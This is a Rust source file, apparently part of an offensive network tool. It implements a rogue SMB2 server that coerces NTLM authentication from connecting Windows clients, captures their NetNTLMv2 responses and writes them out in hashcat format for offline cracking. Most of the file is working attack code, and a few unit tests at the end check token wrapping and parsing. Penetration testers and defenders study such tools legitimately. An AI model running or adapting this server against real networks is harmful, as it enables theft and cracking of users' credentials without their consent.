//! Rogue SMB2 server that coerces NTLM authentication and captures the
//! NetNTLMv2 from the SESSION_SETUP, in hashcat format.
//!
//! Flow: NEGOTIATE -> SESSION_SETUP(Type1) -> challenge(Type2) ->
//! SESSION_SETUP(Type3) -> capture. SPNEGO/GSS wrapping is handled by building
//! the server tokens and by locating the `NTLMSSP\0` blob inside the client's.
use crate::ntlm;
use anyhow::Result;
use std::sync::Arc;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::{TcpListener, TcpStream};
use tokio::sync::Mutex;

const SMB2: [u8; 4] = [0xFE, b'S', b'M', b'B'];
const CMD_NEGOTIATE: u16 = 0x0000;
const CMD_SESSION_SETUP: u16 = 0x0001;
const STATUS_SUCCESS: u32 = 0x0000_0000;
const STATUS_MORE_PROCESSING: u32 = 0xC000_0016;
const NTLMSSP_OID: [u8; 12] = [0x06, 0x0A, 0x2B, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x02, 0x0A];
const SPNEGO_OID: [u8; 8] = [0x06, 0x06, 0x2B, 0x06, 0x01, 0x05, 0x05, 0x02];

/// Minimal DER TLV with short/long form length.
fn der(tag: u8, content: Vec<u8>) -> Vec<u8> {
    let mut v = vec![tag];
    let n = content.len();
    if n < 128 {
        v.push(n as u8);
    } else if n < 256 {
        v.push(0x81);
        v.push(n as u8);
    } else {
        v.push(0x82);
        v.push((n >> 8) as u8);
        v.push(n as u8);
    }
    v.extend(content);
    v
}

/// SPNEGO NegTokenInit advertising only NTLMSSP (for the NEGOTIATE response).
fn spnego_init() -> Vec<u8> {
    let mechlist = der(0x30, NTLMSSP_OID.to_vec());
    let mechtypes = der(0xA0, mechlist);
    let inner = der(0x30, mechtypes);
    let neg = der(0xA0, inner);
    let mut gss = SPNEGO_OID.to_vec();
    gss.extend(neg);
    der(0x60, gss)
}

/// SPNEGO NegTokenResp wrapping the NTLM CHALLENGE (Type 2).
fn spnego_challenge(type2: &[u8]) -> Vec<u8> {
    let neg_state = der(0xA0, vec![0x0A, 0x01, 0x01]); // accept-incomplete
    let supported = der(0xA1, NTLMSSP_OID.to_vec());
    let resp_token = der(0xA2, der(0x04, type2.to_vec()));
    let mut inner = Vec::new();
    inner.extend(neg_state);
    inner.extend(supported);
    inner.extend(resp_token);
    der(0xA1, der(0x30, inner))
}

fn le16(v: u16) -> [u8; 2] {
    v.to_le_bytes()
}
fn le32(v: u32) -> [u8; 4] {
    v.to_le_bytes()
}

fn smb2_header(command: u16, status: u32, mid: u64, session_id: u64) -> Vec<u8> {
    let mut h = vec![0u8; 64];
    h[0..4].copy_from_slice(&SMB2);
    h[4..6].copy_from_slice(&le16(64)); // StructureSize
    h[8..12].copy_from_slice(&le32(status));
    h[12..14].copy_from_slice(&le16(command));
    h[14..16].copy_from_slice(&le16(1)); // credits granted
    h[16..20].copy_from_slice(&le32(0x0000_0001)); // SERVER_TO_REDIR
    h[24..32].copy_from_slice(&mid.to_le_bytes());
    h[40..48].copy_from_slice(&session_id.to_le_bytes());
    h
}

fn filetime_now() -> u64 {
    let secs = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0);
    (secs + 11_644_473_600) * 10_000_000
}

fn negotiate_response(mid: u64, dialect: u16) -> Vec<u8> {
    let sec = spnego_init();
    let mut body = Vec::new();
    body.extend(le16(65)); // StructureSize
    body.extend(le16(1)); // SecurityMode: signing enabled
    body.extend(le16(dialect));
    body.extend(le16(0)); // NegotiateContextCount
    body.extend([0x6c, 0x00, 0x74, 0x00, 0x63, 0x00, 0x61, 0x00, 0x73, 0x00, 0x74, 0x00, 0x00, 0x00, 0x00, 0x00]); // ServerGuid
    body.extend(le32(0)); // Capabilities
    body.extend(le32(0x0010_0000)); // MaxTransactSize
    body.extend(le32(0x0010_0000)); // MaxReadSize
    body.extend(le32(0x0010_0000)); // MaxWriteSize
    body.extend(filetime_now().to_le_bytes()); // SystemTime
    body.extend(0u64.to_le_bytes()); // ServerStartTime
    body.extend(le16(128)); // SecurityBufferOffset (64 header + 64 body)
    body.extend(le16(sec.len() as u16)); // SecurityBufferLength
    body.extend(le32(0)); // NegotiateContextOffset
    let mut msg = smb2_header(CMD_NEGOTIATE, STATUS_SUCCESS, mid, 0);
    msg.extend(body);
    msg.extend(sec);
    msg
}

fn session_setup_response(mid: u64, session_id: u64, status: u32, sec: &[u8]) -> Vec<u8> {
    let mut body = Vec::new();
    body.extend(le16(9)); // StructureSize
    body.extend(le16(0)); // SessionFlags
    body.extend(le16(72)); // SecurityBufferOffset (64 header + 8 body)
    body.extend(le16(sec.len() as u16)); // SecurityBufferLength
    let mut msg = smb2_header(CMD_SESSION_SETUP, status, mid, session_id);
    msg.extend(body);
    msg.extend(sec);
    msg
}

async fn read_nbt(s: &mut TcpStream) -> Option<Vec<u8>> {
    let mut hdr = [0u8; 4];
    s.read_exact(&mut hdr).await.ok()?;
    let len = ((hdr[1] as usize) << 16) | ((hdr[2] as usize) << 8) | (hdr[3] as usize);
    if len == 0 || len > 16 * 1024 * 1024 {
        return None;
    }
    let mut buf = vec![0u8; len];
    s.read_exact(&mut buf).await.ok()?;
    Some(buf)
}

async fn write_nbt(s: &mut TcpStream, payload: &[u8]) -> Result<()> {
    let n = payload.len();
    let hdr = [0u8, (n >> 16) as u8, (n >> 8) as u8, n as u8];
    s.write_all(&hdr).await?;
    s.write_all(payload).await?;
    s.flush().await?;
    Ok(())
}

/// Locates the `NTLMSSP\0` blob inside a GSS/SPNEGO token.
fn find_ntlmssp(buf: &[u8]) -> Option<&[u8]> {
    buf.windows(8).position(|w| w == b"NTLMSSP\0").map(|i| &buf[i..])
}

/// Extracts the SESSION_SETUP security buffer (SPNEGO/GSS token) from a message.
/// Uses checked arithmetic so arbitrary input can never panic.
fn extract_security_token(msg: &[u8]) -> Option<&[u8]> {
    if msg.len() < 80 {
        return None;
    }
    let off = u16::from_le_bytes([msg[76], msg[77]]) as usize;
    let len = u16::from_le_bytes([msg[78], msg[79]]) as usize;
    msg.get(off..off.checked_add(len)?)
}

async fn handle(mut s: TcpStream, out: Arc<Mutex<Option<String>>>, from: String) {
    let session_id: u64 = 0x1122_3344_5566_7788;
    loop {
        let msg = match read_nbt(&mut s).await {
            Some(m) => m,
            None => return,
        };
        // SMB1 multi-protocol negotiate -> answer with an SMB2 negotiate (wildcard)
        if msg.first() == Some(&0xFF) {
            let _ = write_nbt(&mut s, &negotiate_response(0, 0x02FF)).await;
            continue;
        }
        if msg.len() < 64 || msg[0..4] != SMB2 {
            return;
        }
        let command = u16::from_le_bytes([msg[12], msg[13]]);
        let mid = u64::from_le_bytes(msg[24..32].try_into().unwrap());

        match command {
            CMD_NEGOTIATE => {
                let _ = write_nbt(&mut s, &negotiate_response(mid, 0x0202)).await;
            }
            CMD_SESSION_SETUP => {
                let token = match extract_security_token(&msg) {
                    Some(t) => t,
                    None => return,
                };
                let ntlm_msg = match find_ntlmssp(token) {
                    Some(n) => n,
                    None => return,
                };
                let msg_type = ntlm_msg
                    .get(8..12)
                    .map(|b| u32::from_le_bytes([b[0], b[1], b[2], b[3]]))
                    .unwrap_or(0);
                match msg_type {
                    1 => {
                        // Type 1 -> send the challenge (Type 2) wrapped in SPNEGO
                        let sec = spnego_challenge(&ntlm::type2_bytes());
                        let _ = write_nbt(
                            &mut s,
                            &session_setup_response(mid, session_id, STATUS_MORE_PROCESSING, &sec),
                        )
                        .await;
                    }
                    3 => {
                        if let Some(cap) = ntlm::parse_type3_bytes(ntlm_msg) {
                            println!("{}", cap.hashcat);
                            eprintln!("[+] SMB: captured {}\\{} from {from}", cap.domain, cap.user);
                            if let Some(path) = out.lock().await.as_ref() {
                                use std::io::Write;
                                if let Ok(mut f) =
                                    std::fs::OpenOptions::new().create(true).append(true).open(path)
                                {
                                    let _ = writeln!(f, "{}", cap.hashcat);
                                }
                            }
                        }
                        // acknowledge, then drop the connection
                        let _ = write_nbt(
                            &mut s,
                            &session_setup_response(mid, session_id, STATUS_SUCCESS, &[]),
                        )
                        .await;
                        return;
                    }
                    _ => return,
                }
            }
            _ => return,
        }
    }
}

pub async fn run(port: u16, out: Option<String>) -> Result<()> {
    let listener = TcpListener::bind(("0.0.0.0", port)).await?;
    eprintln!("[*] SMB: capturing NetNTLM on {port}");
    let out = Arc::new(Mutex::new(out));
    loop {
        let (s, peer) = listener.accept().await?;
        let _ = s.set_nodelay(true);
        let out = out.clone();
        tokio::spawn(handle(s, out, peer.to_string()));
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn spnego_init_is_well_formed() {
        let b = spnego_init();
        assert_eq!(b[0], 0x60); // GSSAPI application tag
        assert!(b.windows(12).any(|w| w == NTLMSSP_OID)); // advertises NTLMSSP
    }

    #[test]
    fn fuzz_token_extraction_no_panic() {
        let mut x: u64 = 0x1234_5678_9ABC_DEF0;
        for _ in 0..20_000 {
            x ^= x << 13; x ^= x >> 7; x ^= x << 17;
            let len = (x as usize) % 400;
            let buf: Vec<u8> = (0..len).map(|i| (x >> (i % 56)) as u8).collect();
            let _ = extract_security_token(&buf);
            let _ = find_ntlmssp(&buf);
        }
    }

    #[test]
    fn challenge_wraps_the_type2() {
        let t2 = ntlm::type2_bytes();
        let b = spnego_challenge(&t2);
        assert_eq!(b[0], 0xA1); // NegTokenResp
        assert!(find_ntlmssp(&b).is_some()); // contains the NTLMSSP challenge
    }
}
